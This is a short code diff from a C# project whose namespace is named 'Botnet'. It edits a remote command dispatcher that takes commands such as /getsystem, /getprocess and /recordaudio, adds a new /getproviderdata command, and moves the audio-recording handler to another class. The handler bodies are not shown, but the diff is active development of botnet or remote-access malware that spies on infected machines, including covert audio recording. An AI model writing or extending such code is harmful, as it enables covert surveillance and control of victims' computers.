@@ -157,6 +157,9 @@ namespace Botnet
                     case "/getsystem":
                         mainFuncs.GetSystem();
                         break;
+                    case "/getproviderdata":
+                        mainFuncs.GetProviderData();
+                        break;
                     case "/getprocess":
                         mainFuncs.GetProcess();
                         break;
@@ -229,9 +232,9 @@ namespace Botnet
                         break;
                     case "/recordaudio":
                         if (CMD.ComContent != null)
-                            funcs.RecordAudio(CMD.ComContent);
+                            misc.RecordAudio(CMD.ComContent);
                         else
-                            funcs.RecordAudio();
+                            misc.RecordAudio();
                         break;
                     default:
                         int i = 1;
